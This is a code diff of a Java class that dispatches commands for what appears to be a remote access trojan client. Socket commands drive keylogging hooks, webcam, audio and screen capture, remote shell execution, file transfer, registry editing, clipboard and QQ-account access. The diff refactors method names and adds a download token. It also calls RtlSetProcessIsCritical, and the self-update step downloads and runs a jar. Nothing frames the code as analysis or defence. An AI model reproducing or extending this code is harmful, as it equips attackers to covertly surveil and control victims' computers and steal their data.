@@ -1,6 +1,5 @@
 package me.client.utils;
 
-import com.sun.jna.NativeLong;
 import com.sun.jna.Pointer;
 import com.sun.jna.WString;
 import com.sun.jna.platform.win32.Kernel32;
@@ -8,9 +7,7 @@ import com.sun.jna.platform.win32.User32;
 import com.sun.jna.platform.win32.WinDef;
 import me.client.Client;
 import me.client.send.*;
-import oshi.jna.platform.windows.WinNT;
 
-import javax.swing.*;
 import java.awt.*;
 import java.io.DataInputStream;
 import java.io.File;
@@ -73,6 +70,7 @@ public class ReceiveMessage extends Thread{
                     Thread.sleep(1);
                     byte[] head = SendMessage.receiveHead(dataInputStream);
                     int lens;
+                    long Token;
                     byte[] context;
                     switch (head[0]) {
                         case MessageFlags.HEARTPACK:
@@ -85,11 +83,12 @@ public class ReceiveMessage extends Thread{
                                 sendScreen.start();
                                 screenCount++;
                             }else {
-                                SendMessage.SendHead(MessageFlags.SHOW_WINDOW_ERROR,socket);
+                                SendMessage.sendHead(MessageFlags.SHOW_WINDOW_ERROR,socket);
                             }
                             break;
                         case MessageFlags.STOP_SCREEN:
                             sendScreen.run = false;
+                            sendScreen = null;
                             screenCount--;
                             break;
                         case MessageFlags.SHOW_TASKLIST:
@@ -99,7 +98,7 @@ public class ReceiveMessage extends Thread{
                                 sendTaskList.updateTaskList();
                                 systemCount++;
                             }else {
-                                SendMessage.SendHead(MessageFlags.SHOW_WINDOW_ERROR,socket);
+                                SendMessage.sendHead(MessageFlags.SHOW_WINDOW_ERROR,socket);
                             }
                             break;
                         case MessageFlags.UPDATE_TASKLIST:
@@ -107,6 +106,7 @@ public class ReceiveMessage extends Thread{
                             sendTaskList.updateTaskList();
                             break;
                             case MessageFlags.CLOSE_TASKLIST:
+                                sendTaskList = null;
                                 systemCount--;
                                 break;
                         case MessageFlags.STOP_PROCESS:
@@ -125,11 +125,12 @@ public class ReceiveMessage extends Thread{
                                 listen.start();
                                 webCamCount++;
                             }else {
-                                SendMessage.SendHead(MessageFlags.SHOW_WINDOW_ERROR,socket);
+                                SendMessage.sendHead(MessageFlags.SHOW_WINDOW_ERROR,socket);
                             }
                             break;
                         case MessageFlags.STOP_CAMERA:
                             listen.closeCamera();
+                            listen = null;
                             webCamCount--;
                             break;
                         case MessageFlags.SHOW_REMOTECHAT:
@@ -137,7 +138,7 @@ public class ReceiveMessage extends Thread{
                                 chat = new RemoteChat(socket);
                                 remoteChatCount++;
                             }else {
-                                SendMessage.SendHead(MessageFlags.SHOW_WINDOW_ERROR,socket);
+                                SendMessage.sendHead(MessageFlags.SHOW_WINDOW_ERROR,socket);
                             }
                             break;
                         case MessageFlags.SEND_REMOTECHAT:
@@ -147,6 +148,7 @@ public class ReceiveMessage extends Thread{
                             break;
                         case MessageFlags.STOP_REMOTECHAT:
                             chat.closeWindows();
+                            chat = null;
                             remoteChatCount--;
                             break;
                         case MessageFlags.MESSAGEBOX_ERROR_YNC:
@@ -308,10 +310,10 @@ public class ReceiveMessage extends Thread{
                         case MessageFlags.SHOW_REMOTE_CMD:
                             if(cmdCount == 0) {
                                 remoteCmd = new RemoteCmd(socket);
-                                SendMessage.SendHead(MessageFlags.SHOW_REMOTE_CMD, socket);
+                                SendMessage.sendHead(MessageFlags.SHOW_REMOTE_CMD, socket);
                                 cmdCount++;
                             }else {
-                                SendMessage.SendHead(MessageFlags.SHOW_WINDOW_ERROR,socket);
+                                SendMessage.sendHead(MessageFlags.SHOW_WINDOW_ERROR,socket);
                             }
                             break;
                         case MessageFlags.EXECUTE_REMOTE_CMD:
@@ -320,15 +322,16 @@ public class ReceiveMessage extends Thread{
                             remoteCmd.cmdExecute(context);
                             break;
                             case MessageFlags.CLOSE_REMOTE_CMD:
+                                remoteCmd = null;
                                 cmdCount--;
                                 break;
                         case MessageFlags.SHOW_FILEWINDOW:
                             if(fileCount == 0) {
                                 fileManage = new FileManager(socket);
-                                SendMessage.SendHead(MessageFlags.SHOW_FILEWINDOW, socket);
+                                SendMessage.sendHead(MessageFlags.SHOW_FILEWINDOW, socket);
                                 fileCount++;
                             }else {
-                                SendMessage.SendHead(MessageFlags.SHOW_WINDOW_ERROR,socket);
+                                SendMessage.sendHead(MessageFlags.SHOW_WINDOW_ERROR,socket);
                             }
                             break;
                         case MessageFlags.FILE_QUERY:
@@ -367,12 +370,13 @@ public class ReceiveMessage extends Thread{
                             lens = SendMessage.receiveLength(dataInputStream);
                             context = SendMessage.receiveContext(dataInputStream, lens);
                             fileOutputStream.close();
-                            SendMessage.Send(MessageFlags.FILE_UPLOAD_OK,context,socket);
+                            SendMessage.send(MessageFlags.FILE_UPLOAD_OK,context,socket);
                             break;
                         case MessageFlags.FILE_DOWNLOAD:
                             lens = SendMessage.receiveLength(dataInputStream);
+                            Token = SendMessage.receiveToken(dataInputStream);
                             context = SendMessage.receiveContext(dataInputStream, lens);
-                            new Thread(new FileDownload(socket,new String(context))).start();
+                            new Thread(new FileDownload(socket,new String(context),Token)).start();
                             break;
                         case MessageFlags.FILE_HTTPDOWNLOAD:
                             lens = SendMessage.receiveLength(dataInputStream);
@@ -388,6 +392,8 @@ public class ReceiveMessage extends Thread{
                             file1.createNewFile();
                             break;
                             case MessageFlags.CLOSE_FILE_MANAGER:
+                                fileManage = null;
+                                fileManage = null;
                                 fileCount--;
                                 break;
                         case MessageFlags.SHOW_QQNUMBERWINDOW:
@@ -412,7 +418,7 @@ public class ReceiveMessage extends Thread{
                             break;
                         case MessageFlags.SHOW_CLIPBORADWINDOW:
                             setClipboard = new SetClipboard(socket);
-                            SendMessage.SendHead(MessageFlags.SHOW_CLIPBORADWINDOW, socket);
+                            SendMessage.sendHead(MessageFlags.SHOW_CLIPBORADWINDOW, socket);
                             break;
                         case MessageFlags.GET_CLIPBORAD:
                             setClipboard.getClipboard();
@@ -424,18 +430,19 @@ public class ReceiveMessage extends Thread{
                             break;
                         case MessageFlags.SHOW_KEYBORADWINDOW:
                             if(keyBoardCount == 0) {
-                                SendMessage.SendHead(MessageFlags.SHOW_KEYBORADWINDOW, socket);
+                                SendMessage.sendHead(MessageFlags.SHOW_KEYBORADWINDOW, socket);
                                 keyBoardHook = new KeyBoardHook(socket);
                                 keyBoardHook.run = true;
                                 keyBoardHook.start();
                                 keyBoardCount++;
                             }else {
-                                SendMessage.SendHead(MessageFlags.SHOW_WINDOW_ERROR,socket);
+                                SendMessage.sendHead(MessageFlags.SHOW_WINDOW_ERROR,socket);
                             }
                             break;
                         case MessageFlags.CLOSE_KEYBORAD:
                             keyBoardHook.run = false;
                             keyBoardHook.setHookOff();
+                            keyBoardHook = null;
                             keyBoardCount--;
                             break;
                         case MessageFlags.ENUM_WINDOWS:
@@ -511,7 +518,7 @@ public class ReceiveMessage extends Thread{
                                 sendScreen.MouseWheel(s6);
                                 break;
                         case MessageFlags.UPDATE:
-                            LoadDLL.instance.RemoveProcessIsCritical();
+                            LoadNtdll.instance.RtlSetProcessIsCritical(new WinDef.BOOL(false),null,new WinDef.BOOL(false));
                             File file = new File(Client.getWindowsPath1() + "\\new.jar");
                             file.createNewFile();
                             break;
@@ -526,15 +533,15 @@ public class ReceiveMessage extends Thread{
                         case MessageFlags.UPDATE_FILE_END:
                             fileUpdate.close();
                             Runtime.getRuntime().exec("java -jar " + Client.getWindowsPath1() + "\\new.jar " + Kernel32.INSTANCE.GetCurrentProcessId());
-                            SendMessage.SendHead(MessageFlags.UPDATE,socket);
+                            SendMessage.sendHead(MessageFlags.UPDATE,socket);
                             break;
                         case MessageFlags.REGIDTER_WINDOWS_SHOW:
                             if(regCount == 0) {
                                 registerManager = new RegisterManager(socket);
-                                SendMessage.SendHead(MessageFlags.REGIDTER_WINDOWS_SHOW, socket);
+                                SendMessage.sendHead(MessageFlags.REGIDTER_WINDOWS_SHOW, socket);
                                 regCount++;
                             }else {
-                                SendMessage.SendHead(MessageFlags.SHOW_WINDOW_ERROR,socket);
+                                SendMessage.sendHead(MessageFlags.SHOW_WINDOW_ERROR,socket);
                             }
                             break;
                         case MessageFlags.REGIDTER_QUERY_ROOT_KEY:
@@ -567,6 +574,7 @@ public class ReceiveMessage extends Thread{
                             registerManager.createValue(Integer.parseInt(strings3[0]),strings3[1],strings3[2],strings3[3]);
                             break;
                             case MessageFlags.CLOSE_REGIDTER:
+                                registerManager = null;
                                 regCount--;
                                 break;
                          case MessageFlags.REGIDTER_CREATE_KEY:
@@ -589,14 +597,15 @@ public class ReceiveMessage extends Thread{
                                     audio.start();
                                     audioCount++;
                                 }else {
-                                    SendMessage.SendHead(MessageFlags.AUDIO_ERROR,socket);
+                                    SendMessage.sendHead(MessageFlags.AUDIO_ERROR,socket);
                                 }
                             }else {
-                                SendMessage.SendHead(MessageFlags.SHOW_WINDOW_ERROR,socket);
+                                SendMessage.sendHead(MessageFlags.SHOW_WINDOW_ERROR,socket);
                             }
                             break;
                         case MessageFlags.AUDIO_CLOSE:
                             audio.close();
+                            audio = null;
                             audioCount--;
                             break;
                             case MessageFlags.PICTURE_SHOW:
@@ -627,7 +636,7 @@ public class ReceiveMessage extends Thread{
                             lanAccess.post(urls1,heads1,text);
                             break;
                         case MessageFlags.LAN_ACCESS_OPEN:
-                            SendMessage.SendHead(MessageFlags.LAN_ACCESS_OPEN,socket);
+                            SendMessage.sendHead(MessageFlags.LAN_ACCESS_OPEN,socket);
                             lanAccess = new LANAccess(socket);
                             break;
                     }
